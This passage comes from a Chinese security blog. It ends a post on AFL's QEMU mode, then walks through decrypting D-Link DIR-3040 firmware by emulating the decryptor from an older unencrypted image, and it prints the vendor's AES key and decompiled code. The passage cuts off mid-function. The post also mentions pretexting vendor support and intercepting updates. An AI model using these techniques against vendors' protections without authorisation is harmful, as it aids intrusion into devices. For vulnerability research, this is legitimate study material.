<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (qemu_mode) FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">       qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>如果是使用了 qemu mode，会根据 afl-fuzz 的命令参数构造 qemu 的启动参数。在 get_qemu_argv 函数中，主要执行的工作就是为 QEMU 设置相关环境变量，搜索 afl-qemu-trace 程序，构造 afl-qemu-trace 启动的命令参数，也就是将 target_path 修改为如何使用 afl-qemu-trace 执行待 fuzz 程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (qemu_mode)</span><br><span class="line">  use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  use_argv = argv + optind;</span><br></pre></td></tr></table></figure>

<p>那么最终 qemu 模式是如何启动起来的，我根据源码的理解大概是，在 afl-fuzz.c 的 main 函数，在最后的循环中，调用 fuzz_one -&gt; calibrate_case -&gt; init_forkserver -&gt;   execv</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 <span class="title function_">fuzz_one</span><span class="params">(<span class="type">char</span>** argv)</span>;</span><br><span class="line"><span class="type">static</span> u8 <span class="title function_">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem, u32 handicap, u8 from_queue)</span>;</span><br><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">init_forkserver</span><span class="params">(<span class="type">char</span>** argv)</span>;</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在 init_forkserver 函数中，有将变异数据的文件描述符和待 fuzz 程序的标准输入绑定的过程。当使用 execv 执行 afl-qemu-trace，此时 patch 了的 afl-qemu-trace 会在 ELF 的入口处执行 afl_setup() 函数和 afl_forkserver() 函数，进行真正的待 fuzz 程序的执行。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章先简单介绍了 QEMU 执行用户级程序的基本流程，然后通过分析 afl qemu mode 的编译脚本和 diff 文件，简单说明了在 afl 中使用 qemu fuzz 闭源程序的基本流程，然后分析 afl-fuzz.c 源码，简要说明 afl-fuzz 是如何将进行一个变异数据送到待 fuzz 程序中去执行。</p>
<p>如果有问题，或者看到这篇文章的师傅有其他的见解讨论，请联系我，谢谢！</p>
<p>这里有一个简单的对于 AFL qemu mode 的使用，参见<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/12/30/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8Cfuzz/">使用afl对无源码程序进行fuzz</a>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/%E5%BA%94%E5%AF%B9%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BB%8E%E6%9C%AA%E5%8A%A0%E5%AF%86%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/%E5%BA%94%E5%AF%B9%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BB%8E%E6%9C%AA%E5%8A%A0%E5%AF%86%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/" class="post-title-link" itemprop="url">应对加密固件之从未加密老固件进行解密</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 07:17:29 / Modified: 19:20:05" itemprop="dateCreated datePublished" datetime="2023-04-12T07:17:29+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="加密固件之依据老固件进行解密"><a href="#加密固件之依据老固件进行解密" class="headerlink" title="加密固件之依据老固件进行解密"></a>加密固件之依据老固件进行解密</h1><p>IoT漏洞分析最为重要的环节之一就是获取固件以及固件中的文件系统。固件获取的方式也五花八门，硬核派有直接将flash拆下来到编程器读取，通过硬件调试器UART&#x2F;SPI、JTAG&#x2F;SWD获取到控制台访问；网络派有中间人攻击拦截OTA升级，从制造商的网页进行下载；社工派有假装研究者（学生）直接向客服索要，上某鱼进行PY。有时候千辛万苦获取到固件了，开开心心地使用<code>binwalk -Me</code>一把梭哈，却发现，固件被加密了，惊不惊喜，刺不刺激。</p>
<p>如下就是针对如何对加密固件进行解密的其中一个方法：回溯未加密的老固件，从中找到负责对固件进行解密的程序，然后解密最新的加密固件。此处做示范使用的设备是前几天爆出存在漏洞的路由器D-Link DIR 3040 US，固件使用的最新加密版本<a target="_blank" rel="noopener" href="https://support.dlink.com/productinfo.aspx?m=DIR-3040-US">1.13B03</a>，老固件使用的是已经解密固件版本<a target="_blank" rel="noopener" href="https://support.dlink.com/productinfo.aspx?m=DIR-3040-US">1.13B02</a>。</p>
<h2 id="判断固件是否已经被加密"><a href="#判断固件是否已经被加密" class="headerlink" title="判断固件是否已经被加密"></a>判断固件是否已经被加密</h2><p>一般从官网下载到固件的时候，是先以zip等格式进行了一次压缩的，通常可以先正常解压一波。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 1</span></span><br><span class="line">.</span><br><span class="line">├── DIR3040A1_FW112B01_middle.bin</span><br><span class="line">├── DIR3040A1_FW113B03.bin</span><br><span class="line">└── DIR-3040_REVA_RELEASE_NOTES_v1.13B03.pdf</span><br></pre></td></tr></table></figure>

<p>使用binwalk查看一下固件的信息，如果是未加密的固件，通常可以扫描出来使用了何种压缩算法。以常见的嵌入式文件系统squash-fs为例，比较常见的有LZMA、LZO、LAMA2这些。如下是使用binwalk分别查看一个未加密固件（netgear）和加密固件（DIR 3040）信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk GS108Tv3_GS110TPv3_GS110TPP_V7.0.6.3.bix</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk DIR3040A1_FW113B03.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一种方式就是查看固件的熵值。熵值是用来衡量不确定性，熵值越大则说明固件越有可能被加密或者压缩了。这个地方说的是被加密或者压缩了，被压缩的情况也是会让熵值变高或者接近1的，如下是使用<code>binwalk -E</code>查看一个未加密固件（RAX200）和加密固件（DIR 3040）。可以看到，RAX200和DIR 3040相对比，不像后者那样直接全部是接近1了。</p>
<p><img src="/images/image-2023-0412-191809650.png" alt="undifined"></p>
<p><img src="/images/image-2023-0412-191825028.png" alt="undifined"></p>
<h2 id="找到负责解密的可执行文件"><a href="#找到负责解密的可执行文件" class="headerlink" title="找到负责解密的可执行文件"></a>找到负责解密的可执行文件</h2><p>接下来是进入正轨了。首先是寻找到老固件中负责解密的可执行文件。基本逻辑是先从HTML文件中找到显示升级的页面，然后在服务器程序例如此处使用的是lighttpd中去找到何处进行了调用可执行文件下载新固件、解密新固件，这一步也可能是发生在调用的CGI中。</p>
<p>使用find命令定位和升级相关的页面。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*htm*&quot;</span> | grep -i <span class="string">&quot;firmware&quot;</span></span></span><br><span class="line">./etc_ro/lighttpd/www/web/MobileUpdateFirmware.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_e.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_Multi.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_Simple.html</span><br></pre></td></tr></table></figure>

<p>然后现在后端lighttpd中去找相关字符串，似乎没有结果呢，那么猜测可能发生在CGI中。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*httpd*&quot;</span> | xargs strings | grep <span class="string">&quot;firm&quot;</span></span></span><br><span class="line">strings: Warning: &#x27;./etc_ro/lighttpd&#x27; is a directory</span><br></pre></td></tr></table></figure>

<p>从CGI程序中查找，似乎运气不错，，，直接就定位到了，结果过多就只展示了最有可能的结果。Bingo！似乎已经得到了解密固件的程序，img、decrypt。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*cgi*&quot;</span> | xargs strings | grep -i <span class="string">&quot;firm&quot;</span></span></span><br><span class="line">/bin/imgdecrypt /tmp/firmware.img</span><br></pre></td></tr></table></figure>

<h2 id="仿真并解密固件"><a href="#仿真并解密固件" class="headerlink" title="仿真并解密固件"></a>仿真并解密固件</h2><p>拿到了解密程序，也知道解密程序是怎么输入参数运行的，这个时候可以尝试对直接使用qemu模拟解密程序跑起来，直接对固件进行解密。最好保持解密可执行文件在老版本固件文件系统的位置不变，因为不确定是否使用相对或者绝对路径引用了什么文件，例如解密公私钥。</p>
<p>先查看可执行文件的运行架构，然后选择对应qemu进行模拟。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file bin/imgdecrypt</span></span><br><span class="line">bin/imgdecrypt: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./usr/bin</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount -t proc /proc proc/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount --rbind /sys sys/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount --rbind /dev/ dev/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . qemu-mipsel-static /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.22.1 (2020-05-09 10:44:01 CST) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">/ # /bin/imgdecrypt tmp/DIR3040A1_FW113B03.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line">/ # ls -a tmp/</span><br><span class="line">..                      .firmware.orig          .                       DIR3040A1_FW113B03.bin</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>

<p>那么就解压出来了，解压到了tmp文件夹中，.firmware.orig文件。这个时候使用binwalk再次进行查看，可以看到已经被成功解密了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk .firmware.orig</span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x7EA490A0, created: 2020-08-14 10:42:39, image size: 17648005 bytes, Data Address: 0x81001000, Entry Point: 0x81637600, data CRC: 0xAEF2B79F, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 23083456 bytes</span><br><span class="line">1810550       0x1BA076        PGP RSA encrypted session key - keyid: 12A6E329 67B9887A RSA (Encrypt or Sign) 1024b</span><br><span class="line">14275307      0xD9D2EB        Cisco IOS microcode, for &quot;z&quot;</span><br></pre></td></tr></table></figure>

<h2 id="加解密逻辑分析（重点）"><a href="#加解密逻辑分析（重点）" class="headerlink" title="加解密逻辑分析（重点）"></a>加解密逻辑分析（重点）</h2><h3 id="关于固件安全开发到发布的一般流程"><a href="#关于固件安全开发到发布的一般流程" class="headerlink" title="关于固件安全开发到发布的一般流程"></a>关于固件安全开发到发布的一般流程</h3><p>如果要考虑到固件的安全性，需要解决的一些痛点基本上是：</p>
<ul>
<li>机密性：通过类似官网的公开渠道获取到解密后的固件</li>
<li>完整性：攻击者劫持升级渠道，或者直接将修改后的固件上传到设备，使固件升级</li>
</ul>
<p>对于机密性，从固件的源头、传输渠道到设备三个点来分析。首先在源头，官网上或者官方TFP可以提供已经被加密的固件，设备自动或手动检查更新并从源头下载，下载到设备上后进行解密。其次是渠道，可以采用类似于HTTPS的加密传输方式来对固件进行传输。但是前面两种方式终归是要将固件下载到设备中。</p>
<p>如果是进行简单的加密，很常见的一种方式，尤其是对于一些低端嵌入式固件，通常使用了硬编码的对称加密方式，例如AES、DES之类的，还可以基于硬编码的字符串进行一些数据计算，然后作为解密密钥。这次分析的DIR 3040就是采用的这种方式。</p>
<p>对于完整性，开发者在一开始可以通过基于自签名证书来实现对固件完整性的校验。开发者使用私钥对固件进行签名，并把签名附加到固件中。设备在接受安装时使用提前预装的公钥进行验证，如果检测到设备完整性受损，那么就拒绝固件升级。签名的流程一般不直接对固件本身的内容进行签名，首先计算固件的HASH值，然后开发者使用私钥对固件HASH进行签名，将签名附加到固件中。设备在出厂时文件系统中就被预装了公钥，升级通过公钥验证签名是否正确。</p>
<p><img src="/images/image-2023-0412-191853123.png" alt="undifined"></p>
<h3 id="加解密逻辑分析"><a href="#加解密逻辑分析" class="headerlink" title="加解密逻辑分析"></a>加解密逻辑分析</h3><p>既然到这个地方了，那么顺便进去看一看解密程序是如何进行运作的。从IDA的符号表中可以看到，使用到了对称加密AES、非对称加密RSA和哈希SHA512，是不是对比上面提到的固件安全开发到发布的流程，心中大概有个数了。</p>
<p>首先我们进入main函数，可以知道，这个解密程序imgdecrypt实际上也是具有加密功能的。这里提一下，因为想要把整个解密固件的逻辑都撸一撸，可能会在文章里面贴出很多的具体函数分析，那么文章篇幅就会有点长，不过最后会进行一个流程的小总结，希望看的师傅不用觉得啰嗦。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*argv, <span class="string">&quot;decrypt&quot;</span>, envp) )</span><br><span class="line">    result = decrypt_firmare(argc, (<span class="type">int</span>)argv);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = encrypt_firmare(argc, argv);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下一步继续进入到函数decrypt_firmare中，这个地方结合之前仿真可以知道：argc&#x3D;2，argv&#x3D;参数字符串地址。首先是进行一些参数的初始化，例如aes_key、公钥的存储地址pubkey_loc。</p>
<p>接下来是对输入参数数量和参数字符串的判定，输入参数数量从2开始判定，结合之前的仿真，那么argc&#x3D;2，第一个是程序名，第二个是已加密固件地址。</p>
<p>然后在004021AC地址处的函数check_rsa_cert，该函数内部逻辑也非常简单，基本就是调用RSA相关的库函数，读取公钥并判定公钥是否有效，有效则将读取到的RSA对象保存在dword_413220。检查成功后，就进入到004025A4地址处的函数aes_cbc_crypt中。这个函数的主要作用就是根据一个固定字符串0123456789ABCDEF生成密钥，是根据硬编码生成的解密密钥，因此每次生成并打印出来的密钥是相同的，此处密钥用变量aes_key表示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decrypt_firmare</span><span class="params">(<span class="type">int</span> argc, <span class="type">int</span> argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *pubkey_loc; <span class="comment">// [sp+18h] [-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+1Ch] [-18h]</span></span><br><span class="line">  <span class="type">int</span> aes_key[<span class="number">5</span>]; <span class="comment">// [sp+20h] [-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(aes_key, <span class="string">&quot;0123456789ABCDEF&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  pubkey_loc = <span class="string">&quot;/etc_ro/public.pem&quot;</span>;</span><br><span class="line">  i = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( argc &gt;= <span class="number">3</span> )</span><br><span class="line">      pubkey_loc = *(<span class="type">const</span> <span class="type">char</span> **)(argv + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( check_rsa_cert((<span class="type">int</span>)pubkey_loc, <span class="number">0</span>) )   <span class="comment">// 读取公钥并进行保存RSA对象到dword_413220中</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      aes_cbc_crypt((<span class="type">int</span>)aes_key);              <span class="comment">// 生成aes_key</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;key:&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, *((<span class="type">unsigned</span> __int8 *)aes_key + i));<span class="comment">// 打印出key</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">      i = actual_decrypt(*(_DWORD *)(argv + <span class="number">4</span>), (<span class="type">int</span>)<span class="string">&quot;/tmp/.firmware.orig&quot;</span>, (<span class="type">int</span>)aes_key);</span><br><span class="line">      <span class="keyword">if</span> ( !i )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(*(_DWORD *)(argv + <span class="number">4</span>));</span><br><span class="line">        rename(<span class="string">&quot;/tmp/.firmware.orig&quot;</span>, *(_DWORD *)(argv + <span class="number">4</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      RSA_free(dword_413220);</span><br><span class="line">      result = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;sourceFile&gt;\r\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)argv);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是真正的负责解密和验证固件的函数actual_decrypt，位于地址00401770处。在分析这个函数的时候，我发现IDA的MIPS32在反编译处理函数的输入参数的时候，似乎会把数值给弄错了，，，比如fun(a + 10)，可能会反编译成fun(a + 12)。已经修正过函数参数数值的反编译代码就放在下面，代码分析也全部直接放在注释中了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">actual_decrypt</span><span class="params">(<span class="type">int</span> img_loc, <span class="type">int</span> out_image_loc, <span class="type">int</span> aes_key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> image_fp; <span class="comment">// [sp+20h] [-108h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+24h] [-104h]</span></span><br><span class="line">  _DWORD *MEM; <span class="comment">// [sp+28h] [-100h]</span></span><br><span class="line">  <span class="type">int</span> OUT_MEM; <span class="comment">// [sp+2Ch] [-FCh]</span></span><br><span class="line">  <span class="type">int</span> file_blocks; <span class="comment">// [sp+30h] [-F8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+34h] [-F4h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+38h] [-F0h]</span></span><br><span class="line">  <span class="type">int</span> out_image_fp; <span class="comment">// [sp+3Ch] [-ECh]</span></span><br><span class="line">  <span class="type">int</span> data1_len; <span class="comment">// [sp+40h] [-E8h]</span></span><br><span class="line">  <span class="type">int</span> data2_len; <span class="comment">// [sp+44h] [-E4h]</span></span><br><span class="line">  _DWORD *IN_MEM; <span class="comment">// [sp+48h] [-E0h]</span></span><br><span class="line">  <span class="type">char</span> hash_buf[<span class="number">68</span>]; <span class="comment">// [sp+4Ch] [-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> image_info[<span class="number">38</span>]; <span class="comment">// [sp+90h] [-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  image_fp = <span class="number">-1</span>;</span><br><span class="line">  out_image_fp = <span class="number">-1</span>;</span><br><span class="line">  v5 = <span class="number">-1</span>;</span><br><span 